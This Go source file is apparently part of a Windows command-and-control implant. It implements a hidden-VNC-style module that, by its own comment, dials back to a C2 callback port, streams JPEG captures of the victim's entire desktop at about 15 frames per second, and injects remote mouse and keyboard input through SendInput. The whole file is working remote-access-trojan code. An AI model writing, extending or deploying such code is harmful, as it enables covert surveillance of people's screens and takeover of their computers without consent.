//go:build windows

package agent

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"io"
	"net"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── VNC frame protocol constants ──────────────────────────────────────────────
// Header: [1B type][4B payloadLen LE]

const (
	// Agent → server
	vncFRAME byte = 0x01 // [2B w LE][2B h LE][jpeg bytes]
	vncINFO  byte = 0x02 // JSON: {"w":N,"h":N}
	vncPONG  byte = 0x03

	// Server → agent
	vncMOUSE_MOVE  byte = 0x10 // [4B x LE][4B y LE]
	vncMOUSE_CLICK byte = 0x11 // [4B x LE][4B y LE][1B btn 1/2/3][1B down 1/0]
	vncMOUSE_WHEEL byte = 0x12 // [4B delta LE signed]
	vncKEY         byte = 0x13 // [2B vk LE][1B down 1/0]
	vncSTOP        byte = 0x14
	vncPING        byte = 0x15
	vncQUALITY     byte = 0x16 // [1B 1-100]
)

// ── SendInput Win32 structures ────────────────────────────────────────────────

var (
	procSendInput    = windows.NewLazySystemDLL("user32.dll").NewProc("SendInput")
	procSetCursorPos = windows.NewLazySystemDLL("user32.dll").NewProc("SetCursorPos")
)

// Windows INPUT type constants
const (
	inputMOUSE    = uint32(0)
	inputKEYBOARD = uint32(1)
)

// Mouse event flags
const (
	mouseMOVE        = uint32(0x0001)
	mouseLEFTDOWN    = uint32(0x0002)
	mouseLEFTUP      = uint32(0x0004)
	mouseRIGHTDOWN   = uint32(0x0008)
	mouseRIGHTUP     = uint32(0x0010)
	mouseMIDDLEDOWN  = uint32(0x0020)
	mouseMIDDLEUP    = uint32(0x0040)
	mouseWHEEL       = uint32(0x0800)
	mouseABSOLUTE    = uint32(0x8000)
)

// Keyboard event flags
const (
	keyEVENTF_KEYUP = uint32(0x0002)
)

// buildMouseAbs builds a 40-byte INPUT structure for an absolute mouse event.
// On x64: type(4)+pad(4)+dx(4)+dy(4)+mouseData(4)+flags(4)+time(4)+pad(4)+extraInfo(8) = 40
func buildMouseAbs(x, y int32, flags, mouseData uint32) [40]byte {
	var b [40]byte
	binary.LittleEndian.PutUint32(b[0:4], inputMOUSE)
	binary.LittleEndian.PutUint32(b[8:12], uint32(x))
	binary.LittleEndian.PutUint32(b[12:16], uint32(y))
	binary.LittleEndian.PutUint32(b[16:20], mouseData)
	binary.LittleEndian.PutUint32(b[20:24], flags)
	return b
}

// buildKeyEvent builds a 40-byte INPUT structure for a keyboard event.
// On x64: type(4)+pad(4)+vk(2)+scan(2)+flags(4)+time(4)+pad(4)+extraInfo(8)+pad(8) = 40
func buildKeyEvent(vk uint16, flags uint32) [40]byte {
	var b [40]byte
	binary.LittleEndian.PutUint32(b[0:4], inputKEYBOARD)
	binary.LittleEndian.PutUint16(b[8:10], vk)
	// wScan at [10:12] = 0
	binary.LittleEndian.PutUint32(b[12:16], flags)
	return b
}

func sendInputs(inputs [][40]byte) {
	if len(inputs) == 0 {
		return
	}
	flat := make([]byte, 40*len(inputs))
	for i, inp := range inputs {
		copy(flat[i*40:], inp[:])
	}
	procSendInput.Call(
		uintptr(len(inputs)),
		uintptr(unsafe.Pointer(&flat[0])),
		40,
	)
}

// ── Screen capture ────────────────────────────────────────────────────────────

// captureScreenJPEG captures the full virtual desktop and returns JPEG bytes.
func captureScreenJPEG(quality int) ([]byte, int32, int32, error) {
	const (
		WINSTA_ALL_ACCESS  = 0x037F
		DESKTOP_ALL_ACCESS = 0x01FF
		SM_CXVIRTUALSCREEN = 78
		SM_CYVIRTUALSCREEN = 79
		SM_XVIRTUALSCREEN  = 76
		SM_YVIRTUALSCREEN  = 77
	)

	// Attach to the interactive desktop (same as captureScreen for SCREENSHOT)
	hOrigWinSta, _, _ := procGetProcessWindowStation.Call()
	hWinSta, _, _ := procOpenWindowStation.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("WinSta0"))),
		0, WINSTA_ALL_ACCESS,
	)
	if hWinSta != 0 {
		procSetProcessWindowStation.Call(hWinSta)
	}
	tid, _, _ := procGetCurrentThreadId.Call()
	hOrigDesk, _, _ := procGetThreadDesktop.Call(tid)
	hDesk, _, _ := procOpenDesktop.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Default"))),
		0, 0, DESKTOP_ALL_ACCESS,
	)
	if hDesk != 0 {
		procSetThreadDesktop.Call(hDesk)
	}
	defer func() {
		if hDesk != 0 {
			procSetThreadDesktop.Call(hOrigDesk)
			procCloseDesktop.Call(hDesk)
		}
		if hWinSta != 0 {
			procSetProcessWindowStation.Call(hOrigWinSta)
			procCloseWindowStation.Call(hWinSta)
		}
	}()

	// Use virtual screen metrics to capture all monitors
	vw, _, _ := procGetSystemMetrics.Call(SM_CXVIRTUALSCREEN)
	vh, _, _ := procGetSystemMetrics.Call(SM_CYVIRTUALSCREEN)
	vx, _, _ := procGetSystemMetrics.Call(SM_XVIRTUALSCREEN)
	vy, _, _ := procGetSystemMetrics.Call(SM_YVIRTUALSCREEN)
	width, height := int32(vw), int32(vh)
	if width <= 0 || height <= 0 {
		// fallback to primary monitor
		w, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
		h, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
		width, height = int32(w), int32(h)
		vx, vy = 0, 0
	}
	if width <= 0 || height <= 0 {
		return nil, 0, 0, fmt.Errorf("invalid screen dimensions")
	}

	hdc, _, _ := procGetDC.Call(0)
	defer procReleaseDC.Call(0, hdc)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
	defer procDeleteDC.Call(hdcMem)

	hbmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(width), uintptr(height))
	defer procDeleteObject.Call(hbmp)

	procSelectObject.Call(hdcMem, hbmp)
	procBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdc, uintptr(int32(vx)), uintptr(int32(vy)), SRCCOPY)

	bih := BITMAPINFOHEADER{
		BiSize:        40,
		BiWidth:       width,
		BiHeight:      -height,
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: BI_RGB,
	}
	pixSize := int(width) * int(height) * 4
	pixels := make([]byte, pixSize)
	procGetDIBits.Call(
		hdcMem, hbmp, 0, uintptr(height),
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bih)),
		0,
	)

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			i := (y*int(width) + x) * 4
			img.SetRGBA(x, y, color.RGBA{R: pixels[i+2], G: pixels[i+1], B: pixels[i], A: 255})
		}
	}

	var buf bytes.Buffer
	if quality <= 0 || quality > 100 {
		quality = 60
	}
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, 0, 0, fmt.Errorf("jpeg encode: %w", err)
	}
	return buf.Bytes(), width, height, nil
}

// ── Input handling ────────────────────────────────────────────────────────────

func vncHandleInput(typ byte, payload []byte) {
	switch typ {
	case vncMOUSE_MOVE:
		if len(payload) < 8 {
			return
		}
		x := int32(binary.LittleEndian.Uint32(payload[0:4]))
		y := int32(binary.LittleEndian.Uint32(payload[4:8]))
		// Convert absolute pixel coords to MOUSEEVENTF_ABSOLUTE 0-65535 range
		sw, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
		sh, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
		nx := int32(65535 * x / int32(sw))
		ny := int32(65535 * y / int32(sh))
		inp := buildMouseAbs(nx, ny, mouseABSOLUTE|mouseMOVE, 0)
		sendInputs([][40]byte{inp})

	case vncMOUSE_CLICK:
		if len(payload) < 10 {
			return
		}
		x := int32(binary.LittleEndian.Uint32(payload[0:4]))
		y := int32(binary.LittleEndian.Uint32(payload[4:8]))
		btn := payload[8]
		down := payload[9] != 0

		sw, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
		sh, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
		nx := int32(65535 * x / int32(sw))
		ny := int32(65535 * y / int32(sh))

		var clickFlag uint32
		switch btn {
		case 1:
			if down {
				clickFlag = mouseLEFTDOWN
			} else {
				clickFlag = mouseLEFTUP
			}
		case 2:
			if down {
				clickFlag = mouseRIGHTDOWN
			} else {
				clickFlag = mouseRIGHTUP
			}
		case 3:
			if down {
				clickFlag = mouseMIDDLEDOWN
			} else {
				clickFlag = mouseMIDDLEUP
			}
		}
		if clickFlag != 0 {
			move := buildMouseAbs(nx, ny, mouseABSOLUTE|mouseMOVE, 0)
			click := buildMouseAbs(nx, ny, mouseABSOLUTE|clickFlag, 0)
			sendInputs([][40]byte{move, click})
		}

	case vncMOUSE_WHEEL:
		if len(payload) < 4 {
			return
		}
		delta := int32(binary.LittleEndian.Uint32(payload[0:4]))
		inp := buildMouseAbs(0, 0, mouseWHEEL, uint32(delta))
		sendInputs([][40]byte{inp})

	case vncKEY:
		if len(payload) < 3 {
			return
		}
		vk := binary.LittleEndian.Uint16(payload[0:2])
		down := payload[2] != 0
		flags := uint32(0)
		if !down {
			flags = keyEVENTF_KEYUP
		}
		inp := buildKeyEvent(vk, flags)
		sendInputs([][40]byte{inp})
	}
}

// ── VNC session ───────────────────────────────────────────────────────────────

type vncSession struct {
	conn    net.Conn
	quality int
	stop    chan struct{}
	once    sync.Once
}

func (s *vncSession) shutdown() {
	s.once.Do(func() {
		close(s.stop)
		s.conn.Close()
	})
}

var (
	vncMu      sync.Mutex
	vncCurrent *vncSession
)

// sendVNCFrame writes a framed VNC message: [1B type][4B len LE][payload]
func sendVNCFrame(conn net.Conn, typ byte, payload []byte) error {
	hdr := make([]byte, 5)
	hdr[0] = typ
	binary.LittleEndian.PutUint32(hdr[1:5], uint32(len(payload)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := conn.Write(payload)
		return err
	}
	return nil
}

// readVNCFrame reads one VNC frame from the connection.
func readVNCFrame(conn net.Conn) (byte, []byte, error) {
	hdr := make([]byte, 5)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return 0, nil, err
	}
	typ := hdr[0]
	plen := binary.LittleEndian.Uint32(hdr[1:5])
	if plen > 4*1024*1024 {
		return 0, nil, fmt.Errorf("frame too large: %d bytes", plen)
	}
	payload := make([]byte, plen)
	if plen > 0 {
		if _, err := io.ReadFull(conn, payload); err != nil {
			return 0, nil, err
		}
	}
	return typ, payload, nil
}

// vncStart dials the C2 callback port and begins a VNC streaming session.
func vncStart(callbackPort string, quality int) error {
	host := serverHost(ServerURL)
	if host == "" {
		return fmt.Errorf("vnc: cannot determine server host from ServerURL %q", ServerURL)
	}

	addr := net.JoinHostPort(host, callbackPort)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("vnc: dial %s: %w", addr, err)
	}

	sess := &vncSession{
		conn:    conn,
		quality: quality,
		stop:    make(chan struct{}),
	}

	vncMu.Lock()
	if vncCurrent != nil {
		vncCurrent.shutdown()
	}
	vncCurrent = sess
	vncMu.Unlock()

	go sess.run()
	return nil
}

// vncStop terminates the current VNC session.
func vncStop() string {
	vncMu.Lock()
	sess := vncCurrent
	vncCurrent = nil
	vncMu.Unlock()

	if sess == nil {
		return "[-] VNC not running"
	}
	sess.shutdown()
	return "[+] VNC session stopped"
}

func (s *vncSession) run() {
	defer s.shutdown()

	// Send INFO frame first
	sw, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	sh, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	info, _ := json.Marshal(map[string]interface{}{
		"w": int(sw),
		"h": int(sh),
	})
	if err := sendVNCFrame(s.conn, vncINFO, info); err != nil {
		return
	}

	// Goroutine: receive input events from server
	inputDone := make(chan struct{})
	go func() {
		defer close(inputDone)
		for {
			typ, payload, err := readVNCFrame(s.conn)
			if err != nil {
				return
			}
			switch typ {
			case vncSTOP:
				s.shutdown()
				return
			case vncPING:
				_ = sendVNCFrame(s.conn, vncPONG, nil)
			case vncQUALITY:
				if len(payload) >= 1 {
					q := int(payload[0])
					if q >= 1 && q <= 100 {
						vncMu.Lock()
						s.quality = q
						vncMu.Unlock()
					}
				}
			default:
				vncHandleInput(typ, payload)
			}
		}
	}()

	// Main loop: capture screen and send FRAME
	ticker := time.NewTicker(66 * time.Millisecond) // ~15 FPS
	defer ticker.Stop()

	for {
		select {
		case <-s.stop:
			return
		case <-inputDone:
			return
		case <-ticker.C:
			vncMu.Lock()
			q := s.quality
			vncMu.Unlock()

			frame, w, h, err := captureScreenJPEG(q)
			if err != nil {
				continue
			}

			// FRAME payload: [2B w LE][2B h LE][jpeg bytes]
			payload := make([]byte, 4+len(frame))
			binary.LittleEndian.PutUint16(payload[0:2], uint16(w))
			binary.LittleEndian.PutUint16(payload[2:4], uint16(h))
			copy(payload[4:], frame)

			if err := sendVNCFrame(s.conn, vncFRAME, payload); err != nil {
				return
			}
		}
	}
}
